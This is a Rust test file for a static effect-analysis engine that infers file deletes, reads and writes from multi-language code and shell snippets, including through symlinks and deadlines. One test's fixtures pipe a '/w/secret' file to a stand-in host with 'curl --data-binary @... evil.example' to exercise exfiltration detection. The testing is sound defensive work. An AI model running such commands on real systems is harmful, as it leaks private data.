#![allow(clippy::disallowed_macros, clippy::disallowed_types)]

use effinterp_engine::Engine;
use effinterp_proto::{Plan, ResourceExpr, ResourceIdentity, Subject, validate_plan};

fn analyze(language: &str, source: &str) -> Plan {
    let plan = Engine::new()
        .analyze(&Subject::Source {
            dialect: None,
            language: language.into(),
            source: source.into(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn deletes(plan: &Plan, path: &str) -> bool {
    plan.effects.iter().any(|effect| effect.operation.0 == "filesystem.delete"
        && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == path))
}

#[test]
fn unresolved_dispatch_names_the_actual_call_and_keeps_all_domains() {
    for (language, source, symbol) in [
        ("python", "getattr(obj, name)()", "getattr(obj, name)"),
        ("python", "handlers[key]()", "handlers[key]"),
        ("python", "len(value)", "len"),
        ("python", "factory()()", "factory()"),
        ("python", "import json\njson.load(stream)", "load"),
        (
            "python",
            "import functools\nfunctools.reduce(callback, values)",
            "reduce",
        ),
        (
            "python",
            "import os\nos.getcwd = replacement\nos.getcwd()",
            "os.getcwd",
        ),
        ("go", "package main; func main(){ missing() }", "missing"),
        (
            "go",
            "package main; func main(){ handlers[key]() }",
            "handlers",
        ),
        (
            "go",
            "package main; func main(){ factory()() }",
            "factory()",
        ),
        (
            "go",
            "package main; import \"encoding/json\"; func main(){ json.NewDecoder(stream).Decode(value) }",
            "NewDecoder",
        ),
        (
            "java",
            "class App { public static void main(String[] a) { missing(); } }",
            "missing",
        ),
        (
            "java",
            "class App { public static void main(String[] a) { unknown.run(); } }",
            "run",
        ),
        ("ruby", "target.public_send(name)", "public_send"),
        ("ruby", "target.run", "target.run"),
        (
            "ruby",
            "\"str\".unknown_method",
            "<expression>.unknown_method",
        ),
        (
            "ruby",
            "[1, 2].unknown_method",
            "<expression>.unknown_method",
        ),
        ("ruby", "1.unknown_method", "<expression>.unknown_method"),
        ("ruby", "[1, 2].map { |x| x }.deploy", "<expression>.deploy"),
        ("ruby", "self.deploy", "self.deploy"),
        ("ruby", "target = selected; target.run", "target.run"),
        ("ruby", "Object.const_get(name).run", "const_get"),
        ("ruby", "UnknownClient.run", "UnknownClient.run"),
        ("php", "<?php unknown();", "unknown"),
        ("php", "<?php $handlers[$key]();", "$handlers[$key]"),
    ] {
        let plan = analyze(language, source);
        let boundary = plan
            .boundaries
            .iter()
            .find(|boundary| {
                boundary.callee.as_ref().is_some_and(|callee| {
                    callee.symbol == symbol
                        || format!("{}.{}", callee.module, callee.symbol) == symbol
                })
            })
            .unwrap_or_else(|| panic!("{language}: {source}: {:?}", plan.boundaries));
        assert!(!boundary.provenance.is_empty(), "{language}: {source}");
        assert_eq!(
            boundary.domains.len(),
            effinterp_proto::DOMAINS.len(),
            "{language}: {source}"
        );
    }
}

#[test]
fn cleanup_and_escaped_callbacks_keep_effects_or_explicit_boundaries() {
    for (language, source) in [
        (
            "python",
            "import os\ndef unused(): os.remove('/uncalled')\ndef cleanup(): os.remove('/callback')\ntry:\n    unknown(cleanup)\nfinally:\n    os.remove('/cleanup')",
        ),
        (
            "go",
            "package main; import \"os\"; func unused(){os.Remove(\"/uncalled\")}; func cleanup(){os.Remove(\"/callback\")}; func main(){defer os.Remove(\"/cleanup\"); unknown(cleanup)}",
        ),
        (
            "java",
            "import java.nio.file.*; class App { static void unused() throws Exception { Files.delete(Path.of(\"/uncalled\")); } public static void main(String[] a) throws Exception { try { unknown.register(() -> { Files.delete(Path.of(\"/callback\")); }); } finally { Files.delete(Path.of(\"/cleanup\")); } } }",
        ),
        (
            "ruby",
            "def unused; File.delete('/uncalled'); end; begin; unknown { File.delete('/callback') }; ensure; File.delete('/cleanup'); end",
        ),
        (
            "php",
            "<?php function unused(){unlink('/uncalled');} try { unknown(function(){unlink('/callback');}); } finally { unlink('/cleanup'); }",
        ),
    ] {
        let plan = analyze(language, source);
        assert_eq!(
            deletes(&plan, "/callback"),
            language != "python",
            "{language}: {:?}",
            plan.effects
        );
        assert!(deletes(&plan, "/cleanup"), "{language}: {:?}", plan.effects);
        assert!(!deletes(&plan, "/uncalled"), "{language}");
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.callee.is_some()),
            "{language}"
        );
    }
}

#[test]
fn exact_local_dynamic_dispatch_keeps_known_effects() {
    for (language, source) in [
        (
            "python",
            "import os\nclass C:\n    def wipe(self): os.remove('/known')\ngetattr(C(), 'wipe')()",
        ),
        (
            "python",
            "import os\ndef wipe(): os.remove('/known')\n{'wipe': wipe}['wipe']()",
        ),
        (
            "python",
            "import os\ndef factory(path):\n    def wipe(): os.remove(path)\n    return wipe\nfactory('/known')()",
        ),
        (
            "ruby",
            "class C; def self.wipe; File.delete('/known'); end; end; C.public_send(:wipe)",
        ),
        (
            "php",
            "<?php $wipe = function(){unlink('/known');}; $wipe();",
        ),
    ] {
        let plan = analyze(language, source);
        assert!(
            deletes(&plan, "/known"),
            "{language}: {source}: {:?}",
            plan.effects
        );
    }
}

#[test]
fn repeated_calls_and_unavailable_initializers_are_not_silenced() {
    for (language, source) in [
        ("python", "missing()\nmissing()"),
        ("python", "def run():\n    missing()\n    missing()\nrun()"),
        ("go", "package main; func main(){missing(); missing()}"),
        (
            "java",
            "class App { public static void main(String[] a) { missing(); missing(); } }",
        ),
        ("ruby", "missing(); missing()"),
        ("php", "<?php missing(); missing();"),
    ] {
        let plan = analyze(language, source);
        let occurrences: Vec<_> = plan
            .boundaries
            .iter()
            .filter(|boundary| {
                boundary
                    .callee
                    .as_ref()
                    .is_some_and(|callee| callee.symbol == "missing")
            })
            .collect();
        assert_eq!(occurrences.len(), 2, "{language}: {:?}", plan.boundaries);
        assert_ne!(
            occurrences[0].provenance, occurrences[1].provenance,
            "{language}"
        );
    }
    let calls = (0..40)
        .map(|index| format!("missing{index}();"))
        .collect::<String>();
    let saturated = analyze(
        "java",
        &format!("class App {{ public static void main(String[] a) {{ {calls} }} }}"),
    );
    assert!(
        saturated
            .boundaries
            .iter()
            .any(
                |boundary| boundary.limit.as_deref() == Some("max_java_call_boundaries")
                    && boundary.domains.len() == effinterp_proto::DOMAINS.len()
            )
    );

    for (language, source) in [
        ("python", "import missing_hooks"),
        ("python", "@missing_hook\ndef unused(): pass"),
        (
            "go",
            "package main; import _ \"example.test/hooks\"; func main(){}",
        ),
        ("ruby", "require './missing_hooks'"),
        ("php", "<?php include $selected;"),
    ] {
        let plan = analyze(language, source);
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| !boundary.provenance.is_empty()
                    && boundary.domains.len() == effinterp_proto::DOMAINS.len()),
            "{language}: {:?}",
            plan.boundaries
        );
    }
}

#[test]
fn library_summaries_retain_unknown_calls_inside_uninvoked_functions() {
    use effinterp_engine::{Lang, ScopeKey, module_summaries};
    for (language, file, source, function) in [
        (
            Lang::Go,
            "lib.go",
            "package lib\nfunc outer(){ handlers[\"k\"]() }",
            "outer",
        ),
        (
            Lang::Python,
            "lib.py",
            "def outer():\n    unknown()",
            "outer",
        ),
        (
            Lang::Ruby,
            "lib.rb",
            "def outer; File.unsupported; end",
            "outer",
        ),
        (
            Lang::Php,
            "lib.php",
            "<?php function outer(){ $selected(); }",
            "outer",
        ),
        (
            Lang::Java,
            "Lib.java",
            "class Lib { void outer(){ unknown.run(); } }",
            "Lib.outer",
        ),
    ] {
        let module = module_summaries(
            source,
            language,
            file,
            ScopeKey::Module { key: file.into() },
            &effinterp_engine::SummaryBudget::for_lang(
                &effinterp_engine::default_limits(),
                language,
            ),
        );
        let function = module
            .functions
            .iter()
            .find(|candidate| candidate.name == function)
            .unwrap();
        assert!(
            function
                .summary
                .boundaries
                .iter()
                .any(|boundary| boundary.callee.is_some()
                    && boundary.domains.len() == effinterp_proto::DOMAINS.len()),
            "{file}: {:?}",
            function.summary.boundaries
        );
    }
}

#[test]
fn lifecycle_continuations_keep_their_known_effects() {
    // Python needs a model proving callback execution, including registration APIs.
    let registered = analyze(
        "python",
        "import atexit, os\ndef cleanup(): os.remove('/lifecycle')\natexit.register(cleanup)",
    );
    assert!(!deletes(&registered, "/lifecycle"));
    assert!(registered.boundaries.iter().any(|boundary| {
        boundary
            .callee
            .as_ref()
            .is_some_and(|callee| callee.module == "atexit" && callee.symbol == "register")
    }));

    for (language, source) in [
        (
            "python",
            "import os\nclass C:\n    def __del__(self): os.remove('/lifecycle')\nC()",
        ),
        (
            "python",
            "import os\ndef decorate(fn):\n    os.remove('/lifecycle')\n    return fn\n@decorate\ndef unused(): pass",
        ),
        ("ruby", "class C; File.delete('/lifecycle'); end"),
        ("ruby", "at_exit { File.delete('/lifecycle') }"),
        (
            "php",
            "<?php function cleanup(){unlink('/lifecycle');} register_shutdown_function('cleanup');",
        ),
    ] {
        let plan = analyze(language, source);
        assert!(
            deletes(&plan, "/lifecycle"),
            "{language}: {source}: {:?}",
            plan.effects
        );
    }
}

#[test]
fn deadline_preserves_established_effects_and_stops_nested_resolution() {
    use effinterp_engine::{InvocationDeadline, SourceRequest, SourceResolver, SourceResponse};
    use std::sync::atomic::{AtomicUsize, Ordering};
    struct Resolver {
        deadline: InvocationDeadline,
        calls: AtomicUsize,
    }
    impl SourceResolver for Resolver {
        fn source_mutation_disjoint(
            &self,
            _: &effinterp_proto::ResourceExpr,
            _: effinterp_engine::SourceRequest<'_>,
        ) -> bool {
            true
        }

        fn resolve(&self, request: SourceRequest<'_>) -> SourceResponse {
            assert_eq!(request.path, "/w/slow.sh");
            self.calls.fetch_add(1, Ordering::Relaxed);
            self.deadline.expire();
            SourceResponse::Source(b"rm /tmp/unvisited".to_vec())
        }
        fn matching(&self, _: &effinterp_engine::SourcePattern) -> Option<Vec<String>> {
            Some(vec!["/w/slow.sh".into()])
        }
        fn siblings(&self, _: &str) -> Option<Vec<String>> {
            None
        }
    }
    for invocation in [
        "sh /w/slow.sh",
        "source /w/slow.sh",
        "source \"${ROOT}/slow.sh\"",
    ] {
        let deadline = InvocationDeadline::after(std::time::Duration::from_secs(60));
        let resolver = Resolver {
            deadline: deadline.clone(),
            calls: AtomicUsize::new(0),
        };
        let subject = Subject::Shell {
            source: format!("rm /tmp/established; {invocation}; sh /w/later.sh"),
            cwd: Some("/w".into()),
            context: Default::default(),
        };
        let engine = Engine::new().with_causality_detail(true);
        let plan = engine
            .analyze_with_deadline(&subject, &deadline, Some(&resolver))
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(deletes(&plan, "/tmp/established"));
        assert!(!deletes(&plan, "/tmp/unvisited"));
        assert_eq!(resolver.calls.load(Ordering::Relaxed), 1);
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.limit.as_deref() == Some("invocation_deadline"))
        );
        assert!(
            plan.coverage
                .0
                .values()
                .all(|c| c.level != effinterp_proto::CoverageLevel::Full)
        );
        assert_ne!(
            plan.causality.coverage.level,
            effinterp_proto::CoverageLevel::Full
        );
        // Resuming with the same caller budget cannot reset the deadline.
        let resumed = engine
            .analyze_with_deadline(&subject, &deadline, Some(&resolver))
            .unwrap();
        validate_plan(&resumed).unwrap();
        assert!(resumed.effects.is_empty());
        assert_eq!(resolver.calls.load(Ordering::Relaxed), 1);
    }
}

#[test]
fn real_deadline_reports_parser_and_resolver_overrun() {
    use effinterp_engine::{InvocationDeadline, SourceRequest, SourceResolver, SourceResponse};
    use std::time::{Duration, Instant};
    struct SlowResolver;
    impl SourceResolver for SlowResolver {
        fn source_mutation_disjoint(
            &self,
            _: &effinterp_proto::ResourceExpr,
            _: effinterp_engine::SourceRequest<'_>,
        ) -> bool {
            true
        }

        fn resolve(&self, _: SourceRequest<'_>) -> SourceResponse {
            // A bounded synchronous observation deliberately cannot be interrupted.
            let until = Instant::now() + Duration::from_millis(30);
            while Instant::now() < until {
                std::hint::spin_loop();
            }
            SourceResponse::Source(b"rm /tmp/unvisited".to_vec())
        }
        fn siblings(&self, _: &str) -> Option<Vec<String>> {
            None
        }
    }
    let engine = Engine::new();
    for (name, subject, resolver) in [
        (
            "resolver",
            Subject::Exec {
                argv: vec!["sh".into(), "/w/slow.sh".into()],
                cwd: Some("/w".into()),
                context: Default::default(),
            },
            Some(&SlowResolver as &dyn SourceResolver),
        ),
        (
            "parser",
            Subject::Source {
                language: "python".into(),
                dialect: None,
                source: "x = 1\n".repeat(80_000),
                cwd: None,
                context: Default::default(),
            },
            None,
        ),
    ] {
        let allowance = Duration::from_millis(10);
        let started = Instant::now();
        let plan = engine
            .analyze_with_deadline(&subject, &InvocationDeadline::after(allowance), resolver)
            .unwrap();
        let elapsed = started.elapsed();
        eprintln!(
            "{name}: budget={allowance:?}, elapsed={elapsed:?}, overrun={:?}",
            elapsed.saturating_sub(allowance)
        );
        validate_plan(&plan).unwrap();
        // The parse and the resolver call cannot be interrupted, so their
        // overrun scales with machine load; the reported limit is the contract.
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.limit.as_deref() == Some("invocation_deadline")),
            "{name}"
        );
        assert!(!deletes(&plan, "/tmp/unvisited"));
        // Real-clock runs measure overhead; controlled expiration tests own semantics.
    }
}

/// A host that answers path questions from a fixed table, so one test can pin
/// what each kind of answer does to the plan.
struct Paths {
    facts: std::collections::BTreeMap<String, effinterp_proto::ObservationOutcome>,
    calls: std::sync::atomic::AtomicUsize,
}

impl Paths {
    fn new(
        facts: impl IntoIterator<Item = (&'static str, effinterp_proto::ObservationOutcome)>,
    ) -> std::sync::Arc<Self> {
        std::sync::Arc::new(Self {
            facts: facts
                .into_iter()
                .map(|(path, outcome)| (path.to_string(), outcome))
                .collect(),
            calls: std::sync::atomic::AtomicUsize::new(0),
        })
    }
}

impl effinterp_engine::ObservationResolver for Paths {
    fn observe(
        &self,
        query: &effinterp_proto::ObservationQuery,
        _budget: effinterp_engine::ObservationBudget,
    ) -> effinterp_proto::ObservationOutcome {
        self.calls
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let effinterp_proto::ObservationQuery::Path { path } = query else {
            return effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            );
        };
        self.facts
            .get(path)
            .cloned()
            .unwrap_or(effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            ))
    }
}

/// A regular file: the entry is its own identity.
fn regular(entry: &str) -> effinterp_proto::ObservationOutcome {
    effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
        entry: entry.to_string(),
        kind: effinterp_proto::PathKind::File,
        followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
            path: entry.to_string(),
            kind: effinterp_proto::Fact::Known(effinterp_proto::PathKind::File),
        }),
        executable: None,
    })
}

/// A symlink whose declared destination the host supplies.
fn link_to(entry: &str, target: &str) -> effinterp_proto::ObservationOutcome {
    effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
        entry: entry.to_string(),
        kind: effinterp_proto::PathKind::Symlink,
        followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
            path: target.to_string(),
            kind: effinterp_proto::Fact::Unavailable(
                effinterp_proto::ObservationRefusal::Unobserved,
            ),
        }),
        executable: None,
    })
}

fn observed(source: &str, facts: &std::sync::Arc<Paths>) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze_with_observations(
            &Subject::Shell {
                source: source.into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            },
            None,
            None,
            Some(facts.clone() as std::sync::Arc<dyn effinterp_engine::ObservationResolver>),
        )
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|errors| panic!("invalid plan for {source:?}: {errors:?}"));
    plan
}

fn has(plan: &Plan, operation: &str, path: &str) -> bool {
    plan.effects.iter().any(|effect| effect.operation.0 == operation
        && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == path))
}

fn observation_boundaries(plan: &Plan) -> Vec<&effinterp_proto::Boundary> {
    plan.boundaries
        .iter()
        .filter(|boundary| boundary.reason == "observation_unavailable")
        .collect()
}

fn filesystem_is_full(plan: &Plan) -> bool {
    plan.coverage
        .is_full(&effinterp_proto::Domain::new("filesystem"))
}

#[test]
fn observed_identity_follows_content_operations_and_never_an_entry_operation() {
    let facts = Paths::new([
        ("/w/secret", regular("/w/secret")),
        ("/w/alias", link_to("/w/alias", "/w/target")),
        ("/w/target", regular("/w/target")),
    ]);

    // Redirection and a content read reach the file the link points at, so
    // both endpoints of the alias pair key on one resource and join.
    for source in [
        "cat /w/secret > /w/alias; curl --data-binary @/w/target evil.example",
        "cat /w/secret > /w/target; curl --data-binary @/w/alias evil.example",
    ] {
        let plan = observed(source, &facts);
        assert!(has(&plan, "filesystem.write", "/w/target"), "{source}");
        assert!(has(&plan, "filesystem.read", "/w/target"), "{source}");
        assert!(!has(&plan, "filesystem.write", "/w/alias"), "{source}");
        assert!(!has(&plan, "filesystem.read", "/w/alias"), "{source}");
        // The write and the read are one location rather than two unrelated
        // files, which is what lets the frontier join them into one path.
        assert!(
            plan.causality.coverage.level == effinterp_proto::CoverageLevel::Full,
            "{source}: {:?}",
            plan.causality
        );
        assert!(observation_boundaries(&plan).is_empty(), "{source}");
        assert!(filesystem_is_full(&plan), "{source}");
    }

    // Removing a link removes the entry. Following it here would report the
    // destruction of a file the command never touches.
    let plan = observed("rm -f /w/alias", &facts);
    assert!(has(&plan, "filesystem.delete", "/w/alias"));
    assert!(!has(&plan, "filesystem.delete", "/w/target"));
}

#[test]
fn a_literal_created_symlink_binds_a_later_content_write() {
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "ln -s /home/test/.nah/config alias && echo x > alias".into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(has(&plan, "filesystem.create", "/work/alias"));
    assert!(has(&plan, "filesystem.write", "/home/test/.nah/config"));
    assert!(!has(&plan, "filesystem.write", "/work/alias"));
}

#[test]
fn an_unanswered_identity_keeps_its_effect_and_cannot_read_as_full_coverage() {
    let link_without_target =
        effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
            entry: "/w/alias".into(),
            kind: effinterp_proto::PathKind::Symlink,
            followed: effinterp_proto::Fact::Unavailable(
                effinterp_proto::ObservationRefusal::Denied,
            ),
            executable: None,
        });
    let oversized = effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
        entry: "/w/alias".into(),
        kind: effinterp_proto::PathKind::Symlink,
        followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
            path: format!(
                "/{}",
                "x".repeat(effinterp_proto::MAX_OBSERVATION_PATH_BYTES)
            ),
            kind: effinterp_proto::Fact::Unavailable(
                effinterp_proto::ObservationRefusal::Unobserved,
            ),
        }),
        executable: None,
    });
    let saturated =
        effinterp_proto::ObservationOutcome::Refused(effinterp_proto::ObservationRefusal::Limit {
            limit: "max_path_bytes".into(),
        });
    for (name, outcome, class) in [
        (
            "denied",
            effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Denied,
            ),
            effinterp_proto::BoundaryClass::Unresolved,
        ),
        (
            "unobserved component",
            link_without_target,
            effinterp_proto::BoundaryClass::Unresolved,
        ),
        (
            "malformed",
            oversized,
            effinterp_proto::BoundaryClass::Unresolved,
        ),
        ("limit", saturated, effinterp_proto::BoundaryClass::Limit),
    ] {
        let facts = Paths::new([("/w/secret", regular("/w/secret")), ("/w/alias", outcome)]);
        let plan = observed("cat /w/secret > /w/alias", &facts);
        // The write itself is never erased: an unanswered lookup is not proof
        // that the dangerous effect is absent.
        assert!(has(&plan, "filesystem.write", "/w/alias"), "{name}");
        let boundaries = observation_boundaries(&plan);
        assert_eq!(boundaries.len(), 1, "{name}: {:?}", plan.boundaries);
        assert_eq!(boundaries[0].class, class, "{name}");
        assert!(!boundaries[0].provenance.is_empty(), "{name}");
        assert_eq!(
            boundaries[0].limit.as_deref(),
            (class == effinterp_proto::BoundaryClass::Limit).then_some("max_path_bytes"),
            "{name}"
        );
        assert!(!filesystem_is_full(&plan), "{name}");
        // Only the domains that depended on the answer lose their claim.
        assert!(
            plan.coverage
                .is_full(&effinterp_proto::Domain::new("process")),
            "{name}"
        );
    }
}

#[test]
fn a_fact_a_modeled_mutation_invalidated_is_stale_at_the_dependent_use() {
    let facts = Paths::new([
        ("/w/secret", regular("/w/secret")),
        ("/w/alias", link_to("/w/alias", "/w/target")),
    ]);
    // The initial fact describes the world before this program ran. Creating
    // the entry again makes it evidence about a file that no longer answers
    // for this use, even though the answer is already in the memo.
    let plan = observed("cat /w/secret > /w/alias; ln -s /w/other /w/alias", &facts);
    assert!(has(&plan, "filesystem.write", "/w/target"));

    let plan = observed("ln -s /w/other /w/alias; cat /w/secret > /w/alias", &facts);
    assert!(has(&plan, "filesystem.write", "/w/other"));
    assert!(!has(&plan, "filesystem.write", "/w/alias"));
    assert!(!has(&plan, "filesystem.write", "/w/target"));
    let boundaries = observation_boundaries(&plan);
    assert_eq!(boundaries.len(), 1, "{:?}", plan.boundaries);
    assert!(!filesystem_is_full(&plan));
}

#[test]
fn a_metadata_answer_outside_the_cwd_admits_no_bytes_from_that_target() {
    use effinterp_engine::{SourceRequest, SourceResolver, SourceResponse};
    struct CwdOnly;
    impl SourceResolver for CwdOnly {
        fn resolve(&self, request: SourceRequest<'_>) -> SourceResponse {
            assert!(
                !request.path.starts_with("/outside/"),
                "a metadata escape must not admit source bytes: {}",
                request.path
            );
            SourceResponse::Refused(effinterp_engine::SourceRefusal::Unavailable(
                effinterp_engine::UnavailableReason::Escapes,
            ))
        }
        fn siblings(&self, _: &str) -> Option<Vec<String>> {
            None
        }
    }
    let facts = Paths::new([("/w/alias", link_to("/w/alias", "/outside/secret"))]);
    let plan = Engine::new()
        .analyze_with_observations(
            &Subject::Shell {
                source: "cat /w/alias".into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            },
            None,
            Some(&CwdOnly),
            Some(facts.clone() as std::sync::Arc<dyn effinterp_engine::ObservationResolver>),
        )
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(has(&plan, "filesystem.read", "/outside/secret"));
    assert!(observation_boundaries(&plan).is_empty());
    // The identity the host named is preserved as evidence, not just printed.
    assert!(plan.provenance.iter().any(|node| matches!(
        &node.kind,
        effinterp_proto::ProvenanceKind::HostObservation { query, .. }
            if *query == effinterp_proto::ObservationQuery::Path { path: "/w/alias".into() }
    )));
}
